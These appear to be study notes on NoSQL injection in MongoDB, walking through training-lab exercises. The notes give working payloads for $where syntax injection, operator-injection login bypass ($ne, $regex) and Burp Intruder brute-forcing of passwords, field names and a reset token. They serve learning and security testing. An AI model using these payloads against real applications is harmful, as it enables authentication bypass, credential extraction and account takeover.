 There are two different types of NoSQL injection:
 - Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
 - Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.

### Lab: Detecting NoSQL injection
There's a vulnerable to nosqli endpoint:
```bash
GET /filter?category=Accessories HTTP/1.1
```
So we try:
```bash
GET /filter?category=Accessories' 
```
And we get back the err:
```
Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: unterminated string literal :
functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
&apos; on server 127.0.0.1:27017. The full response is {&quot;ok&quot;: 0.0, &quot;errmsg&quot;: &quot;SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n&quot;, &quot;code&quot;: 139, &quot;codeName&quot;: &quot;JSInterpreterFailure&quot;}
```
On the backend they have something like:
```bash
const result = await productMongooseModel.find({ $where: `this.category === '${req.query.category}'`})
```
That `$where` from official mongodb docs:
```
Use the $where operator to pass either a string containing a JavaScript expression or a full JavaScript function to the query system
```
To solve the lab, we need to perform a NoSQL injection attack that causes the application to display unreleased products. 

Therefore we check if we can inject boolean conditions to change the response
(don't forget to url encode, here is just shown in this way for the sake of readability)
```
GET /filter?category=Gifts' && 0 && 'x
```
Before the injection GET /filter?category=Gifts retrived 3 products but with the condition `&& 0` mongo returns `false` for every item in the collection and as a result we see no products in the response.

Later if we change to:
```
GET /filter?category=Gifts' && 1 && 'x
```
We see our 3 products again

So to see all products let's modify to the following (don't forget to url-encode):
```
GET /filter?category=Gifts' || 1 || 'x
```
And we see more than 3 products (we see all of them)


## NoSQL operator injection
## Submitting query operators
In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`. 

For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`. If this doesn't work, you can try the following: 
1. Convert the request method from `GET` to `POST`.
1. Change the `Content-Type` header to `application/json`.
1. Add JSON to the message body.
1. Inject query operators in the JSON.

## Detecting operator injection in MongoDB
 Consider a vulnerable application that accepts a username and password in the body of a `POST` request:
```
{"username":"wiener","password":"peter"}
```
Test each input with a range of operators. For example, to test whether the username input processes the query operator, you could try the following injection: 
```
{"username":{"$ne":"invalid"},"password":{"peter"}}
```
 If the `$ne` operator is applied, this queries all users where the username is not equal to invalid.

If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload: 
```
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```
This query returns all login credentials where both the username and password are not equal to `invalid`. As a result, you're logged into the application as the first user in the collection. 

To target an account, you can construct a payload that includes a known username, or a username that you've guessed. For example: 
```
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```
### Lab: Exploiting NoSQL operator injection to bypass authentication
Endpoint:
```bash
POST /login HTTP/1.1

{"username":"wiener","password":"peter"}
```
Change to:
```bash
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

## Exploiting syntax injection to extract data 
In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's $where operator and mapReduce() function. This means that, if a vulnerable application uses these operators or functions, the database may evaluate the JavaScript as part of the query. You may therefore be able to use JavaScript functions to extract data from the database.

Consider a vulnerable application that allows users to look up other registered usernames and displays their role. This triggers a request to the URL:
```
https://insecure-website.com/user/lookup?username=admin
```

This results in the following NoSQL query of the users collection:
```
{"$where":"this.username == 'admin'"}
```

As the query uses the $where operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload:
```
admin' && this.password[0] == 'a' || 'a'=='b
```

This returns the first character of the user's password string, enabling you to extract the password character by character.

You could also use the JavaScript match() function to extract information. For example, the following payload enables you to identify whether the password contains digits:
```
admin' && this.password.match(/\d/) || 'a'=='b
```

### Lab: Exploiting NoSQL injection to extract data
There's an endpoint:
```
GET /user/lookup?user=wiener HTTP/2
```
Making sure it is vulnerable (not url encoded for the sake of readability):
```
GET /user/lookup?user=wiener' && '1' == '1
```
Find out the password length
```
GET /user/lookup?user=administrator' && this.password.length < 30 || 'a'=='b
```

Right-click the request and select Send to Intruder.
In Intruder, enumerate the password:
- Change the user parameter to `administrator' && this.password[ยง0ยง]=='ยงaยง`. This includes two payload positions. Make sure to URL-encode the payload.
- Select Cluster bomb attack from the attack type drop-down menu.
- In the Payloads side panel, select position 1 from the Payload position drop-down list. Add numbers from 0 to 7 for each character of the password.
- Select position 2 from the Payload position drop-down list, then add lowercase letters from a to z. If you're using Burp Suite Professional, you can use the built-in a-z list.
- Click Start attack.
- Sort the attack results by Payload 1, then Length. Notice that one request for each character position (0 to 7) has evaluated to true and retrieved the details for the administrator user. Note the letters from the Payload 2 column down.

In Burp's browser, log in as the administrator user using the enumerated password. The lab is solved.

### Identifying field names
Because MongoDB handles semi-structured data that doesn't require a fixed schema, you may need to identify valid fields in the collection before you can extract data using JavaScript injection.

For example, to identify whether the MongoDB database contains a password field, you could submit the following payload:
```
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

Send the payload again for an existing field and for a field that doesn't exist. In this example, you know that the username field exists, so you could send the following payloads:
```
admin' && this.username!=' 
```
```
admin' && this.foo!='
```
If the password field exists, you'd expect the response to be identical to the response for the existing field (username), but different to the response for the field that doesn't exist (foo).

If you want to test different field names, you could perform a dictionary attack, by using a wordlist to cycle through different potential field names. 

> Note:
> 
> You can alternatively use NoSQL operator injection to extract field names character by character. This enables you to identify field names without having to guess or perform a dictionary attack. We'll teach you how to do this in the next section.

### Lab: Exploiting NoSQL operator injection to extract unknown fields
To solve the lab, log in as carlos. 

There's a login endpoint:
```bash
POST /login HTTP/2

{"username":"carlos","password":"montana"}
```
I get `Invalid username or password` error. 

If I change the req.body to the following:
```bash
{"username":"carlos","password":{"$ne":""}}
```
I get back:
`Account locked: please reset your password`
This response indicates that the `$ne` operator has been accepted and the application is vulnerable


### Lab: Exploiting NoSQL operator injection to extract unknown fields  
User login is vulnerable to nosqli. We try:
```
{
    "username":"carlos",
    "password":{
        "$ne": ""
    }
}
```
We get back `account is locked` error. Which means that the password was correct but the account had been blocked before we tried to log into it.

Mongo also has the `$where` operator which accepts a string of a javascript code.
So we try:
```bash
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "function() {return 0}"}
```
Or the same but simplified:
```bash
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
```
And we receive: `Invalid username or password` err.
If we change `"$where": "1"`
We get `account locked` err again

After the injection, on the backend it probably looks something like:
```bash
await userMongooseModel.find({"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"})
```

So we first figure out how many fields the user document has:
```bash
{
    "username":"carlos",
    "password":{"$ne":"invalid"},
    "$where": "function() { return Object.keys(this).length === 4 }"
}
```
So there are 4 fields in user document. We know for sure the first one is `_id`, 
```bash
{
    "username":"carlos",
    "password":{"$ne":"invalid"},
    "$where": "function() { return Object.keys(this)[1] === 'username' }"
}
```
The second (at index 1) is `username`
```bash
{
    "username":"carlos",
    "password":{"$ne":"invalid"},
    "$where": "function() { return Object.keys(this)[2] === 'password' }"
}
```
The third (at index 2) is `password`

And now we need to figure out what is the name of the last field in user document
```bash
{
    "username":"carlos",
    "password":{"$ne":"invalid"},
    "$where": "function() { return Object.keys(this)[3].startsWith('a') }"
}
```
So we now are bruteforcing the value between `startsWith(<valueToBeBruteForced>)`
After finding the first letter we then brute force the second, and so on:
```bash
...
"$where": "function() { return Object.keys(this)[3].startsWith('e<second letter to be brute forced>') }"
```
So we now know that the fourth field is `email`

**Important**: after hitting reset password endpoint with username `carlos` a new field in the user document was created and the following returns true.
```bash
"$where": "function() { return Object.keys(this).length === 5 }"
```
So we now brute force the name of the fifth field:
```bash
"$where": "function() { return Object.keys(this)[4].startsWith('ยงaยง') }"
```
Eventually via brute force we figure out the name of the fifth field which is `passwordReset`

Now we need to brute force the value of that `passwordReset`.
e.g. in burp Intruder it can be done in the following way:
```bash
"$where": "function() { return this['passwordReset'].match('^.{ยงยง}ยงยง.*') }"
```
- Then select Cluster bomb attack from the attack type drop-down menu.
- In the Payloads side panel, select position 1 from the Payload position drop-down list, then set the Payload type to Numbers. Set the number range, for example from 0 to 20.
- Select position 2 from the Payload position drop-down list and make sure the Payload type is set to Simple list. Add all numbers, lower-case letters and upper-case letters as payloads. If you're using Burp Suite Professional, you can use the built-in word lists a-z, A-Z, and 0-9.
- Click  Start attack.
- Sort the attack results by Payload 1, then Length, to identify responses with an Account locked message instead of the Invalid username or password message. Note the letters from the Payload 2 column down.

Then
- In Repeater, submit the value of the password reset token in the URL of the GET / forgot-password request: GET /forgot-password?YOURTOKENNAME=TOKENVALUE
- Right-click the response and select Request in browser > Original session. Paste this into Burp's browser
- Change Carlos's password, then log in as carlos to solve the lab
